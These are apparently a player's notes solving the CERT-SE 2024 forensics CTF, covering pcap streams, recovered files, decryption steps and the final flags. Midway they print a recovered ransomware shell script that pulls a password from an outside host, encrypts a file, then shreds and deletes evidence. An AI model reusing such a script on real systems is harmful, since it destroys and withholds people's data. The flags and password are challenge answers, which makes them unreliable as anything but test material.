#CTF
### Original file: CERT-SE_CTF2024.pcap

Identified ip/mac addresses on file:
An4lys3r/Employee 1: 	IP: 10.0.0.10 MAC: 52:54:00:16:f6:1f
D3f3nd3r/Employee 2: 	IP: 10.0.0.20 MAC: 52:54:00:11:19:a7
??: 			IP: 10.0.0.30 MAC: 52:54:00:52:dc:1f
Server?:		IP: 10.0.0.50 MAC: 52:54:00:6f:d7:65

Suspicious ip address: 195.200.72.82
FTP packets to presumed server shows the credentials to this server.
User: anonymous 
Pass: NcFTP@


#### Stream 0:

stream 0 and 1 are the same but 10.0.0.10 is involved in stream 1 and .20 in stream 0. .30 is involved in both.

Holds a conversation from employees discovering they have been hacked. Same on stream 1, only from the other employees perspective.
From beginning of stream output of system
:irc.ctf.alt 005 D3f3nd3r CHANNELLEN=50 NICKLEN=9 TOPICLEN=490 AWAYLEN=127 KICKLEN=400 MODES=5 MAXLIST=beI:50 EXCEPTS=e INVEX=I PENALTY FNC :are supported on this server
:irc.ctf.alt 251 D3f3nd3r :There are 1 users and 0 services on 1 servers
:irc.ctf.alt 253 D3f3nd3r 1 :unknown connection(s)
:irc.ctf.alt 254 D3f3nd3r 1 :channels formed
:irc.ctf.alt 255 D3f3nd3r :I have 1 users, 0 services and 0 servers
:irc.ctf.alt 265 D3f3nd3r 1 2 :Current local users: 1, Max: 2
:irc.ctf.alt 266 D3f3nd3r 1 2 :Current global users: 1, Max: 2
:irc.ctf.alt 250 D3f3nd3r :Highest connection count: 2 (4 connections received)
:irc.ctf.alt 375 D3f3nd3r :- irc.ctf.alt message of the day
:irc.ctf.alt 372 D3f3nd3r :- "Hello world!"
:irc.ctf.alt 376 D3f3nd3r :End of MOTD command

Found first flag on packet 1742.
Second on packet 4.

packet 147 the person in the datacenter sends over ransom note. /home/user/emergency_net/DCC/RANSOM_NOTE.gz
SHA-256 checksum to go along: 7113f236b43d1672d881c6993a8a582691ed4beb4c7d49befbceb1fddfb14909

Someone posted a wordlist scraped from their public website, and ranting about recording web traffic from workstation CTF-PC01.

IP they found suspicious. Involved in [[Attacks on networks#C2 or C&C |C2]] and exfiltration activities. 195.200.72.82

#### Stream 2:
ransom
#### Stream 3:
corp_net1.pcap file sent to .20

#### Stream 4:
Packet 391 seems to have something to do with programming c++ buffer error and an error from a python library.
Packet 394 is very strange. Maybe has something to do with c++?
Packet 384/977 has something about a puzzle.exe
Packet 981 has some more whatyoulookingat.com and also polisen.se
Encrypted data but at the bottom is alot of "whatyoulookingat.com".
Also packet 1030 has alot of windows directory from recycle bin. and also whatyoulookingat.com, cloudflare.net and sapo.se.cdn.
They seem to have extracted Recycle-Bin.zip here also.

Extracted corp_net1.pcap here.

#### Stream 5:

corp_net2.pcap file sent to .20

#### Stream 6:

Looking at stream 3 where a request was made to get corp_net2.pcap, packet that said "ok to send data" was nr. 1128se and first packet of stream 6 was 1132 I figured this was probably
that .pcap file so i saved it as raw data with file extention .pcap, I was correct.

#### Stream 7:

disk1.img.gz file is sent to .20

#### Stream 8:

extracted file disk1.img.gz. Altough it cannot be decompressed with winrar.

#### Stream 10:

Seems to be the wordlist. 
Extracted file.

Extracted file: corp_net2.pcap

Extracted file: disk1.img.gz

## File disk1.img.gz

It was corrupted, but using [[Pen testing tools#Gzrecover|gzrecover]] and then [[Pen testing tools#TestDisk|testDisk]] I was able to extract 4 files.
1. secret
2. secret.encrypted
3. sslkeylogfile
4. ransomware.sh
After inspecting the files I found that sslkeylogfile contained some ssl keys for TLS 1.3.
Ransomware.sh contained a shell script that encrypted secret using -aes-128-cbc cipher with [[Pen testing tools#Openssl|openssl]], outputting the secret.encrypt file and then shredded the secret file with 'shred' command before removing it and the sslkeylogfile.
### ransomware.sh
`#!/bin/bash 
`password=$(SSLKEYLOGFILE=sslkeylogfile curl --insecure https://whatyoulookingat.com/1.txt)
`openssl enc -aes-128-cbc -pass pass:$password -in secret -out secret.encrypted
`shred secret
`rm secret
`rm sslkeylogfile
`rm $0

The secret file is probably a lost cause, I will instead focus on cracking the secret.encrypt file since I know aes128 was used and the sslkeylogfile previously extracted is probably going to help me decrypt the traffic where the password was obtained from whatyoulookingat.com.

## ransomNote.gz

After neglecting this file I ran gzrecover on it and got a ASCII text file. But the file was corrupted. The checksum is wrong, the original conversation the had the checksum provided: 7113f236b43d1672d881c6993a8a582691ed4beb4c7d49befbceb1fddfb14909.

## corp_net1.pcap
### secret.encrypted

Here I found the password for the secret.encrypted file. Since I knew from the ransomware.sh script that the password was obtained from `whatyoulookingat.com/1.txt`, I searched for this as a regular expression in packet details. This led me to tcp stream 53 in this file. And packet 1920 had a payload of 17 bytes which had the password. 

	Password: pheiph0Xeiz8OhNa

Now I could decrypt the file. 
```
openssl enc -d -aes-128-cbc -in secret.encrypted -out secret.txt -pass pass:pheiph0Xeiz8OhNa
```
And in secret.txt was CTF\[OPPORTUNISTICALLY]

### puzzle.exe

After tls decryption of this file I found on stream 59 that puzzle.exe was extracted. This is most likely the file transmitted on stream 60.
This was correct, it is a puzzle.
Solved the puzzle, gave nothing, must be something more about it though.

#### Reverse engineer
#SRE 
Running `file puzzle.exe` in [[SRE Tools#Git bash|gitbash]] tells that it is a `PE32+ excecutable (GUI) x86-64, for MS Windows, 6 sections.`

Decompiling with [[SRE Tools#IDA|IDA]]

### recycle-bin.zip

Stream 63 mentions transferring file Recycle-bin.zip. Extracted on stream 64.
The files seem to only reference where they where on the original computer. 
But there was an HFS HTTP file server .exe under the name $RL7SXXI.exe here where I could add the files and view them in the browser.

Alot of interesting files here. Might have to use IDA to see what $ID8WDX0.exe and $IL7SXXI.exe does because windows wont let me run it.

$RCXHUFJ.zip has NewFileTime.exe.

$RZ8ZSGB.zip holds file "Biografi" with 69 .txt files, each of 1kb size. All files is just one word of "Lorem ipsum" in order it seems.

$IZ8ZSGB.zip, $ICXHUFJ.zip, $IWOD8TX.zip is damaged, using gzrecover got me nowhere. They all have 0x00 0x02 as magic number in beginning of file.
### archive

Stream 66 mentions transferring file archive. Extracted on 67.

## corp_net2.pcap
### unauthorized html

Stream 57 had an html file where something was unauthorized.
### FLAGS:

CTF\[E65D46AD10F92508F500944B53168930]
CTF\[AES128]
CTF\[OPPORTUNISTICALLY]